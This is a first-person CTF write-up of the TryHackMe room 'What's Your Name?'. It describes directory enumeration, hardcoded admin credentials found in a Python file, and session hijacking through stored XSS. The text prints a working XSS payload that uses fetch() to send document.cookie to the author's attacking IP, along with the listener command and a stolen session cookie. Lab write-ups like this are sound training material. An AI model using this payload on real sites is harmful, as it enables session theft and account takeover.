!!! Due to the single name “project”, some repositories have swapped images!!! 

Project: What's Your Name? — XSS and Session Hijacking
Project Goal:
The goal of this project was to complete the TryHackMe CTF room "What's Your Name?". The main objective was to identify an XSS vulnerability and use it to hijack the moderator's session cookie in order to access restricted sections of the website and retrieve both flags.
Project Description:
I completed this task on the TryHackMe platform.
Target machine IP: 10.10.137.153,
My attacking machine IP: 10.10.62.23.

Initial Reconnaissance:
I started by adding the domains worldwap.thm and login.worldwap.thm to the /etc/hosts file.
Then, using Gobuster, I performed directory enumeration which revealed interesting paths such as /admin.py, /phpmyadmin, /index.php, and /profile.php.

Credential Discovery:
While reviewing the admin.py file, I discovered hardcoded credentials:

username = 'admin'
password = 'Un6u3$$4Bl3!!'
Using these credentials, I successfully logged into the application at http://login.worldwap.thm/login.php.

XSS Attack:
After logging in, I explored the profile.php page and identified an input field vulnerable to XSS.
I injected the following payload:

<img src=x onerror="fetch('http://10.10.62.23:8080/?c='+document.cookie)">
Before this, I started a simple Python HTTP server:

sudo python3 -m http.server 8080
Session Cookie Hijacking:
Within a few seconds, my terminal displayed a request containing the moderator’s session cookie:

GET /?c=PHPSESSID=pu36b3affituhi76ek7agopcij
I copied this cookie and replaced my own via the browser's DevTools.

Access to Moderator Panel and Flag Retrieval:
After replacing the cookie, I gained access to the moderator panel and successfully captured the second flag.

Conclusion:
This project demonstrated the critical importance of testing web applications for XSS vulnerabilities and the risks associated with poorly secured session handling.
I not only practiced web enumeration and analysis, but also executed a full session hijacking attack. This challenge strengthened my understanding of OWASP-level vulnerabilities and showcased how easily a system can be compromised without proper data protection.
